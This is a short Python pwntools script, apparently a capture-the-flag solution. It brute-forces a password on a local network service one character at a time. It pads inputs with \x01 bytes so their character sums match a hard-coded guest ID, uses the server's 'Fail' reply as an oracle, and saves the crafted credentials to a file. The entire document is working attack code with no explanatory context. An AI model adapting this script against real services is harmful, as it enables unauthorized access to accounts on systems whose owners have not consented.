from pwn import *

def string_sum(str):
	return sum([ord(c) for c in str])

GUEST_ID = "Y0u4reMyGuestILikeYouIWi11GiveAChance"
GUEST_SUM = string_sum(GUEST_ID)

key = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

pw = ''

while True:
	flag = False
	for c in key:
		t = pw + c
		p = remote('localhost', 2778)
		
		p.sendline(GUEST_ID + '\x01' * (string_sum(t) - GUEST_SUM))
		p.sendline(t + '\x01' * (GUEST_SUM - string_sum(t)))

		print 'try %s' % t
		get = p.recvline(timeout=1)
		p.close()

		if not 'Fail' in get:
			pw += c
			print 'current pw: %s' % pw
			flag = True
			break
	if not flag:
		break
print pw
print string_sum(pw)

f = open('guest', 'w')
f.write(GUEST_ID + '\x01' * (string_sum(pw) - GUEST_SUM) + '\n')
f.write(pw + '\x01' * (GUEST_SUM - string_sum(pw)) + '\n')
f.close()
